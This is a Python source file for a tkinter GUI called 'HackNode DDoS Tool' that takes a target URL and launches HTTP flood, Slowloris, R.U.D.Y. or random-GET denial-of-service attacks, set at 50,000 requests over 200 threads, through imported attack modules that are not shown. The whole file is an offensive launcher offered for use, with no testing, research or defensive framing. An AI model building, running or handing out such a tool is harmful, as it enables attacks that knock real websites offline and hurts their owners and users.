import tkinter as tk
from tkinter import messagebox, ttk
import threading
from attack import http_flood, slowloris, rudy, random_get  # Import attack modules

# Function to start the attack
def start_attack():
    target_url = url_entry.get()
    attack_type = attack_type_var.get()

    if target_url == "":
        messagebox.showerror("Error", "Please enter a valid URL.")
        return

    start_button.config(state=tk.DISABLED)
    attack_type_dropdown.config(state=tk.DISABLED)
    url_entry.config(state=tk.DISABLED)

    threading.Thread(target=run_attack, args=(target_url, attack_type)).start()

# Function to run the attack
def run_attack(target_url, attack_type):
    num_requests = 50000  # Number of requests to send
    threads = 200  # Number of threads for attack

    if attack_type == "HTTP Flood":
        print(f"Starting {attack_type} on {target_url}...")
        http_flood.http_flood_attack(target_url, num_requests, threads)
    elif attack_type == "Slowloris":
        print(f"Starting {attack_type} on {target_url}...")
        slowloris.slowloris_attack(target_url)
    elif attack_type == "R.U.D.Y.":
        print(f"Starting {attack_type} on {target_url}...")
        rudy.rudy_attack(target_url)
    elif attack_type == "Random GET":
        print(f"Starting {attack_type} on {target_url}...")
        random_get.random_get_attack(target_url)

    start_button.config(state=tk.NORMAL)
    attack_type_dropdown.config(state=tk.NORMAL)
    url_entry.config(state=tk.NORMAL)

# Create main window
root = tk.Tk()
root.title("HackNode DDoS Tool")
root.geometry("500x300")

# Title label
title_label = tk.Label(root, text="HackNode DDoS Tool", font=("Arial", 20))
title_label.pack(pady=20)

# Attack type selection
attack_type_label = tk.Label(root, text="Select Attack Type:")
attack_type_label.pack()

attack_type_var = tk.StringVar()
attack_type_var.set("HTTP Flood")  # Default selection
attack_type_dropdown = ttk.Combobox(root, textvariable=attack_type_var, values=["HTTP Flood", "Slowloris", "R.U.D.Y.", "Random GET"], state="readonly")
attack_type_dropdown.pack(pady=10)

# URL input
url_label = tk.Label(root, text="Enter Target URL:")
url_label.pack()

url_entry = tk.Entry(root, width=40)
url_entry.pack(pady=10)

# Start button
start_button = tk.Button(root, text="Start Attack", command=start_attack, bg="red", fg="white", font=("Arial", 14))
start_button.pack(pady=20)

# Start the GUI
root.mainloop()
